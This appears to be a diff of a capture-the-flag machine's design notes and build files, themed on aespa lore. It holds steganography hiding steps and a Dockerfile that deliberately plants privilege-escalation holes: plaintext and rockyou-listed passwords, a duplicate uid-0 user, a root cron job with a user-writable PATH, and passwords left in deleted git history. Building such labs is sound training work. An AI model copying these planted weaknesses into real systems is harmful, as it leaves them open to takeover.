+- - binwalk flowers video named ae-ningning_kermit_dance.mp4 (video can be found from this name, big hint, easy)
+- - flowers video has steghide password flowers (rockyou)
+no need for thorough binwalk, this is an easy version. for FTP 
+
+- karina pic:
+ -  - this is a tutorial for your near future 
+
+if they find FTP they find filebrowser: 
+put fb info inside images in FTP 
+🔍 Why it works against tools: steghide, stegseek scan pixel data; they never look past EOI. binwalk might flag trailing data as “raw”, but without the key and the knowledge to extract it properly, it’s just random noise.
+
+    ⚠️ Be aware: the appended data can be stripped by re‑encoding the image. But for a CTF where the image is served as‑is, this is excellent.
+
+how would they even find that if they dont know 
+
+bash
+
+# create a payload file
+echo "secret info" > payload.txt
+# encrypt with a strong key (e.g., AES-256)
+openssl enc -aes-256-cbc -salt -in payload.txt -out payload.enc -pass pass:"CTF2026"
+# append the encrypted blob to a JPEG
+cat cover.jpg payload.enc > hidden.jpg
+
+Extract
+bash
+
+# find the offset of the raw encrypted data (after FFD9)
+dd if=hidden.jpg of=extracted.enc bs=1 skip=... # (manually locate position)
+# or use binwalk / hex editor; then decrypt
+openssl enc -aes-256-cbc -d -in extracted.enc -out revealed.txt -pass pass:"CTF2026"
+
+- portal pic 
+- flowers vid inside 
+
+
+
+
+bash
+
+# create a payload file
+echo "secret info" > payload.txt
+# encrypt with a strong key (e.g., AES-256)
+openssl enc -aes-256-cbc -salt -in payload.txt -out payload.enc -pass pass:"CTF2026"
+# append the encrypted blob to a JPEG
+cat cover.jpg payload.enc > hidden.jpg
+
+Extract
+bash
+
+# find the offset of the raw encrypted data (after FFD9)
+dd if=hidden.jpg of=extracted.enc bs=1 skip=... # (manually locate position)
+# or use binwalk / hex editor; then decrypt
+openssl enc -aes-256-cbc -d -in extracted.enc -out revealed.txt -pass pass:"CTF2026"
+
+
+
+
+- hide file-browser link in FTP 
+
+
+# Problemas
+cuidado pra nao usar nginx, ou qqr csa q introduz unauthenticated RCE 
+
+
+nota: flower e cooper estao na rockyou.txt
+
+
+# Misc NOtes
+
+there is a process running as root, a script 
+the script calls a command by name 
+user will try to 
+
+its in folder or process /armageddon
+script is synk 
+synk echoes something like ' You are one of multiple alternate selves. You live in a fake city. You may be the one building the world, or the one destroying it in order to reach reality ' 
+
+would be cool if synk was a crontab -- is that on theme with cron or not? 
+
+supernova non root user can create a file to path hijack, but supernova whole filesys is locked by sudo write (is it possible to lock this do they may ONLY write if they got SUDO password?)
+
+supernova doesnt actually get to run anything as root despite having a sudo -- is this possible? if not, give them sudo only for the specific commands for file write & read
+
+
+for consider that the story of this ctf follows aespa's story 
+
+ctf starts as giselle in scene 1
+
+the ae are born, lexistence precedes lessence
+
+a strange phenomenon is happening
+
+the ae copied aespa looks and are living their own lives releasing music 
+
+the ae and the aespa are all copied 
+
+winter realizes that theyve been living in a fake world and to reach reality they must destroy parts and embrace hidden parts (can be a reference to git) of  themselves (steal root)
+
+
+this is the official lore 
+Armageddon’s lore is about aespa bringing destruction upon themselves in order to destroy the artificial world they exist in. WDA are the 4 horses of the apocalypse bringing destruction
+
+WINTER merging with the giant eye and growing wings symbolizes awakening, while the collapsing AI city represents destruction of that fake controlled reality
+
+The hip hop versions of aespa represent theirselves trapped in the system while the bizarre superhuman versions are their future evolved selves
+
+aespa lore explained by Karina
+
+Karina: The aespa in reality and the fake aespa keeps getting mixed together, the reason is that in reality, us, the Armageddon aespa, Dirty Work aespa, Whiplash aespa etc the aespas that should be in different worlds have banded together in one place. For example, there are four more of me here, so it gets confusing right? So a rupture forms in this world
+
+
+
+
+
+
+| Technical Concept    | Story Meaning                 |
+| -------------------- | ----------------------------- |
+| Current files        | Present identity              |
+| History              | Forgotten memories            |
+| Deleted content      | Repressed self                |
+| Branches             | Alternate selves              |
+| Merge                | Accepting multiple identities |
+| Root                 | New, merged, real reality. original root is one thing, but achieving PE root is like merging hidden parts and compromising the previous fake               |
+| Privilege escalation | Reaching the truth            |
+| Enumeration          | Self-discovery                |
+| Hidden files         | Suppressed memories           |
+
+
+change user names in machine image: 
+- aespa: the one serving website
+- WTMW: file browser
+- supernova: ftp
+- armageddon: root 
+
+
+---
+./docker-compose.yml
+---
+services:
+  who-ae-u:
+    build: .
+    container_name: who-ae-u
+
+    ports:
+      - "93:80"
+      - "28:21"
+      - "8080:8080"    # Apache2 (Secured Static Web)
+
+---
+./dockerfile
+---
+FROM ubuntu:26.04
+# TODO WHAT USER takes care of ftp what if theyre compromised, 
+ENV DEBIAN_FRONTEND=noninteractive
+
+# Added apache2 to package installation list
+RUN apt-get update && apt-get install -y --no-install-recommends \
+    bash \
+    cron \
+    ca-certificates \
+    curl \
+    tar \
+    vsftpd \
+    sudo \
+    git \
+    apache2 \
+    && rm -rf /var/lib/apt/lists/*
+
+# Remove the default "ubuntu" user (if it exists) and create the only root user: armageddon
+RUN if id ubuntu >/dev/null 2>&1; then userdel -r ubuntu; fi && \
+    useradd -ou 0 -g 0 -m -d /armageddon -s /bin/bash armageddon && \
+    echo "armageddon:l'essence_is_killing_everyone_and_their_copies" | chpasswd && \
+    echo "root:l'essence_is_killing_everyone_and_their_copies" | chpasswd
+
+# Create CTF users
+RUN useradd -m supernova && \
+    echo "supernova:sususu_mixed_the_aes_and_the_aespa" | chpasswd && \
+    useradd -m aespa && \
+    echo "aespa:cooper" | chpasswd && \
+    useradd -m welcomeToMyWorld && \
+    echo "welcomeToMyWorld:and_thank_you_naevis_we_love_you_WTMW" | chpasswd
+
+# Sudo rules: NOPASSWD for cat inside home, password required for outside
+RUN echo 'supernova ALL=(root) NOPASSWD: /bin/cat /home/supernova/*' > /etc/sudoers.d/supernova && \
+    echo 'supernova ALL=(root) PASSWD: /bin/cat /etc/*, /bin/cat /var/log/*, /bin/cat /tmp/*, /bin/cat /usr/bin/*' >> /etc/sudoers.d/supernova
+
+# Create directories and set ownership
+RUN mkdir -p \
+    /home/supernova/file-browser \
+    /home/supernova/singularity \
+    /home/aespa/ftp \
+    /armageddon && \
+    chown -R supernova:supernova /home/supernova && \
+    chown armageddon:root /armageddon
+
+# Cool "whip" effect (singularity command)
+COPY wda4.sh /usr/bin/singularity
+RUN chmod 755 /usr/bin/singularity
+
+# Bash prompt: singularity runs randomly before each prompt
+RUN cat <<'EOF' >> /etc/bash.bashrc
+# --- SIMULATION GLITCH ---
+export PROMPT_COMMAND='if (( RANDOM % 100 < 30 )); then singularity 2>/dev/null; fi'
+# --- END SIMULATION GLITCH ---
+EOF
+
+# Cron job: runs singularity every minute, PATH hijackable by supernova
+RUN cat <<'EOF' > /etc/cron.d/wda4
+PATH=/home/supernova/singularity:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+* * * * * root singularity >> /var/log/singularity.log 2>&1
+EOF
+# Restrict cron file to root only (owner read/write, no group/other access)
+RUN chmod 600 /etc/cron.d/wda4
+
+# Pre-create the log file with restricted permissions
+RUN touch /var/log/singularity.log && \
+    chmod 600 /var/log/singularity.log && \
+    chown root:root /var/log/singularity.log
+
+# ── Everything below runs as supernova ──────────────────
+USER supernova
+
+# Install filebrowser
+RUN mkdir -p /home/supernova/bin && \
+    curl -L https://github.com/filebrowser/filebrowser/releases/download/v2.63.1/linux-amd64-filebrowser.tar.gz \
+         -o /tmp/fb.tar.gz && \
+    tar -xzf /tmp/fb.tar.gz -C /home/supernova/bin && \
+    chmod +x /home/supernova/bin/filebrowser && \
+    rm -f /tmp/fb.tar.gz
+
+RUN echo 'export PATH=/home/supernova/bin:$PATH' >> /home/supernova/.bashrc
+
+# Git lore with secrets hidden in deleted files and commit messages
+RUN cd /home/supernova && \
+    git config --global user.email "supernova@kwangya" && \
+    git config --global user.name "supernova" && \
+    git init && \
+    echo "# The ae are born from digital footprints" > README.md && \
+    echo "# They share the same face but are learning to be themselves" >> README.md && \
+    echo "" >> README.md && \
+    echo "Lexistence precede lessence." >> README.md && \
+    git add README.md && \
+    git commit -m "existence precedes essence" && \
+    echo "The first villain was never the AI entity breaking the connection between people and their aes. It was always ourselves." > journal.txt && \
+    echo "Before these REAL WORLD glitches, Ningning kept asking if we saw something weird. She's got eye damage from childhood, but I think her sight is special. She saw the whole sky turn red the day we found naevis." >> journal.txt && \
+    echo "She dealt the killing blow to the entity separating our connection with the ae. With an overwhelming amount of corrupted data. How else are we to defeat an AI that foresees all our attacks?" >> journal.txt && \
+    echo "But the entity was connected with the SYNK, and that 'poisoned' the web between universes. Now, our aes have copied our looks, and are living their own lives." >> journal.txt && \
+    echo "It's a mess. All these glitches are happening because aespa and aes from different worlds are colliding, after naevis sacrificed herself and stopped guarding the Portal Of Souls." >> journal.txt && \
+    echo "" >> journal.txt && \
+    echo "Haven't seen her in forever. Wish her all the best. We know she ressucitated, but does she also have clones? Even our aes are being copied around." >> journal.txt && \
+    echo "password: sususu_mixed_the_aes_and_the_aespa" >> journal.txt && \
+    git add journal.txt && \
+    git commit -m "When we meet again, there is a password we set. That's another story to explain. It's about the aespa that mixed with the aes and turned into these demigod superbeings, like, some kinda supernova." && \
+    git rm journal.txt && \
+    git commit -m "The supernova were a group of aespa and aes that accepted each other. Even the ugly parts. Some others were killed off, fake ones." && \
+    rm -f journal.txt && \
+    echo "It was never about villains stopping us. It was always about l'essence, the path of a person defining themselves. We have fake parts. We have ugly parts. Beautiful, public, honest, we all have different sides. It was always about realizing we lived in a fake reality that spawned from ourselves, killing off some fake parts, accepting sides of us we didn't know to recognize -- the reflection that moves different from you in the mirror." > status.txt && \
+    echo "" >> status.txt && \
+    echo "Do not look back. Only forward." >> status.txt && \
+    git add status.txt && \
+    git commit -m "It was always about defining ourselves." && \
+    git checkout -b kwangya && \
+    echo "NAEVIS is calling. The real world exists beyond FLAT." > kwangya_signal.txt && \
+    echo "" >> kwangya_signal.txt && \
+    echo "To merge with your true self, you must accept what was deleted." >> kwangya_signal.txt && \
+    echo "The password lies in the memory you chose to forget." >> kwangya_signal.txt && \
+    git add kwangya_signal.txt && \
+    git commit -m "signal from the other side" && \
+    git checkout master
+
+# Extra lore: deleted clue about the armageddon daemon
+RUN echo "The armageddon represents the conflict between the aes and the aespa of multiple worlds. The singularity that intersects lives that should parallel." > /home/supernova/wda.txt && \
+    echo "There were all kinds of people there. Superbeing Winter could fly, Karina was a vampire, and Giselle was a freaking time traveller. She fixed some mess while Ningning burned the place. " >> /home/supernova/wda.txt && \
+    echo "Giselle still does something every minute. It basically means they killed a bunch of fake ideas they lived by, accepted unrecognizable parts of themselves, and grew into themselves. When they defined their essence, they became truly godlike. They dominated everything, but not necessarily by killing. Just subjugating their old selves for how they lived. She keeps doing her own kinda singularity every freaking minute, so that others can reach higher. " >> /home/supernova/wda.txt && \
+    echo "There are 4 aespa that are really scary though. They're Whole Different Animals, they're kinda one apocalyptical creature that keeps policing around. Sometimes I see the WDA Winter watching. " >> /home/supernova/wda.txt && \
+    cd /home/supernova && git add wda.txt && git commit -m "Winter's eyes" && \
+    git rm wda.txt && git commit -m "remove trace" && rm -f wda.txt
+
+
+# ---------- WEB (APACHE2 SECURE HARDENING) ------
+# Switch back to root for web service 
+
+# ---------- WEB (APACHE2 SECURE HARDENING) ------
+USER root
+
+# Create web directory and copy files
+RUN mkdir -p /var/www/static && chown -R welcomeToMyWorld:welcomeToMyWorld /var/www/static
+COPY app/web/ /var/www/static/
+COPY app/media/ /var/www/static/
+RUN chown -R welcomeToMyWorld:welcomeToMyWorld /var/www/static
+
+# Reconfigure Apache to run on port 8080, serve /var/www/static
+RUN sed -i 's/Listen 80/Listen 8080/' /etc/apache2/ports.conf && \
+    sed -i 's/<VirtualHost \*:80>/<VirtualHost \*:8080>/' /etc/apache2/sites-available/000-default.conf && \
+    sed -i 's|DocumentRoot /var/www/html|DocumentRoot /var/www/static|' /etc/apache2/sites-available/000-default.conf
+
+# Drop Apache runtime identity to welcomeToMyWorld
+RUN sed -i 's/export APACHE_RUN_USER=www-data/export APACHE_RUN_USER=welcomeToMyWorld/' /etc/apache2/envvars && \
+    sed -i 's/export APACHE_RUN_GROUP=www-data/export APACHE_RUN_GROUP=welcomeToMyWorld/' /etc/apache2/envvars && \
+    mkdir -p /var/log/apache2 /var/lock/apache2 /var/run/apache2 && \
+    chown -R welcomeToMyWorld:welcomeToMyWorld /var/log/apache2 /var/lock/apache2 /var/run/apache2
+
+# Enable headers module (optional, for the X-Hint header)
+RUN a2enmod headers
+
+# Append custom configuration (safe, no broken \n)
+RUN cat <<'EOF' >> /etc/apache2/apache2.conf
+
+AddType video/mp4 .mp4
+Header always set X-Hint "/scene1"
+
+<Directory /var/www/static>
+    Options -Indexes
+    AllowOverride None
+    Require all granted
+</Directory>
+EOF
+
+
+# ---------------------------
+
+COPY file-browser/ /home/supernova/file-browser/
+COPY entry.sh /entry.sh
+COPY vsftpd.conf /etc/vsftpd/vsftpd.conf
+
+RUN chown -R supernova:supernova /home/supernova && \
+    chown -R aespa:aespa /home/aespa && \
+    chmod +x /entry.sh
+
+EXPOSE 80 21 8080
+
+CMD ["/entry.sh"]
+
+---
+./entry.sh
+---
+#!/bin/sh
+set -e
+
+DB=/home/supernova/filebrowser.db
+FILEBROWSER=/home/supernova/bin/filebrowser
+
+# init filebrowser
+if [ ! -f "$DB" ]; then
+    su -s /bin/sh supernova -c "
+        $FILEBROWSER config init \
+            --database $DB \
+            --root /home/supernova/file-browser
+    "
+fi
+
+# start cron properly (Docker-safe)
+cron
+
+# services
+vsftpd /etc/vsftpd/vsftpd.conf &
+
+su -s /bin/sh supernova -c "
+    $FILEBROWSER \
+        --address 0.0.0.0 \
+        --port 80 \
+        --root /home/supernova/file-browser \
+        --database $DB
+" &
+
+# Read Apache environment details & execute the web engine safely in background
+. /etc/apache2/envvars
+apache2 -D FOREGROUND &
+
+# IMPORTANT: keep container alive
+tail -f /dev/null
+
+---
+
+
+---
 ./vsftpd.conf
 ---
 listen=YES
@@ -557,171 +980,6 @@ seccomp_sandbox=NO
 pam_service_name=vsftpd
 
 ---
-./wda4.sh
----
-frames=(
-  '▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒░░▒░▒▒▒▒░▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▒░░░
-▒░░░░░░░▒▒░▒░░░▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒▒▒▒▒▒▒▒▒▒▒▒▒░▒▒░▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▒░░░░░░░░░░░░░░░
-▒░░░░░ ░░░▒░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒░░░░░ ░            ░░▒
-▒░░          ░ ░▒░░▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▒░░     ▒▓▓▓▓▓▒▒░░ ░░░░▒▒
-▒░░░░░░░   ░ ▒▒▒▒▒░░▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▓▒▒ ░   ░░░▓▓▓▓▒▒▒░░░░░▒▒▒▒
-▒▒▒▒░░░░░░░░░▒▒▓▒▒░░░ ▒▒▓▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▓▒░  ░░░░▒▒▒▒░░░░░░░░▒▒▒▒▒
-▒▒▒▒▒▒▒▒░░░░░░░░░░░░░▒▒▒▓▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▓▓▒▒▒▒░░░░▒░░░░░░▒▒▒▒▒▒▒▒▒
-▓▒▒▒▓▓▒▒▒▒▒▒▒░░░░▒▒▒▒▒▒▓▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▓▒▒▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▓▒▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒'
-  '▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▒░░░
-▒░░▒░▒░░▒▒░▒░░░░▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒▒▒▒▒▒▒▒▒▒▒▒▒░▒▒░▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░
-▒░░░░░░░░░░▒▒▒▒▒░░░▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒░░░░░             ░░▒
-▒░░       ░       ░░▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒░          ░░░  ░░░░▒▒
-▒░░░░░░░▒▒▒ ░░ ░░░░▒░▒▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒▒▒ ░▒▒▒░░░░░ ▒▒▒░░░░░▒▒▒▒
-▒▒▒▒░░░░░░▒▒▒  ░░░░░░ ▒▓▓▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▓▒░ ░░░░▒▒▒▒▒░░ ░░ ░░▒▒▒▒▒
-▒▒▒▒▒▒▒░░░░░░░░░▒░░▒▒▒▒▒▓▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▓▒▒▒▒▒░░░▒▒▒▒▒▒░░▒▒▒▒▒▒▒▒▒
-▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▓▒▒▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▒▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▓▒▒▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒'
-  '▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒░░▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▒░░░
-▒░░▒░▒░░▒▒░░░░░▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒▒▒▒▒▒▒▒▒▒▒▒▒░▒▒░▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░
-▒░░░░░░░░░░░▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒░░░░░░             ░▒
-▒░░      ░▒▒▒░  ▒  ░░▒▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒░░ ░░▒       ░░░░░░░▒▒
-▒░░░░░░░▒▒▒▒▒▒░░     ░▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒▒▒ ░▒▒▓▓▓▒ ░░░ ▒░░░░░▒▒▒▒
-▒▒▒▒░░ ░░░▒▒▒▒▒░░░░░  ░▓▓▒▒▒▒▓▓▓▓▓▒▒▒▒▓▓▓▒░ ░░░▒▒▒▒▒▒░░░░░░░░▒▒▒▒▒
-▒▒▒▒▒▒▒░░░░░░░░░░░░▒▒▒▒▒▓▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▓▒▒▒▒▒▒▒░▒░▒▒░░░░▒▒▒▒▒▒▒▒▒
-▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▓▒▒▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▒▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▓▒▒▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒'
-  '▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▒░░░
-▒░░▒░▒░░▒▒░▒░░░▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒▒▒▒▒▒▒▒▒▒▒▒▒░▒▒░▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░
-▒░░░░░░░░░░▒▒▒▒▒░░░▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒░░░░░             ░░▒
-▒░░       ░       ░░▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒░          ░░░  ░░░░▒▒
-▒░░░░░░░▒▒▒ ░░ ░░░░▒░▒▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒▒▒ ░▒▒▓░░░░░ ▒▒▒░░░░░░▒▒▒
-▒▒▒▒░░░░░░▒▒▒  ░░░░░  ▒▓▓▒▒▒▒▓▓▓▓▓▒▒▒▒▓▓▓▒░ ░░░░▒▒▒▒▒░░ ░░░░░▒▒▒▒▒
-▒▒▒▒▒▒▒░░░░░░░░░░░░▒▒▒▒▒▓▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▓▒▒▒▒▒▒░▒▒▒▒▒░▒░░▒▒▒▒▒▒▒▒▒
-▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▓▒▒▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▒▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▓▒▒▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒'
-  '▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒░░▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▒░░░
-▒░░░░▒░░▒▒░▒░░░░▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒▒▒▒▒▒▒▒▒▒▒▒▒░▒▒░▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
